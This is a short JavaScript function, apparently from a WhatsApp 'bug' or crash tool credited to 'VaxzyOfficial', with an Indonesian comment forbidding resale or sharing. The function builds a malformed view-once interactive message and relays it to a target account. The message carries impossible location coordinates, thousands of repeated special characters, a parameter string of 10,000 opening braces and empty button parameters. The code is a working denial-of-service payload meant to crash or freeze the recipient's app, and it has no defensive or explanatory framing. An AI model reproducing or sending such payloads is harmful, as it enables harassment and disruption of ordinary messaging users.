//DI LARANG KERAS UNTUK DI PERJUAL BELIKAN AGAR TIDAK CEPAT KE FIX NO SHARE FREE KETAHUAN SHARE? TERIMA KONSEKUENSI. Copyright: VaxzyOfficial

async function VerloadXCallFc(target) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyNotFound🐉",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
              },
            },
            body: { 
              text: `‌VaxzyNotFound🐉${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await Vxz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}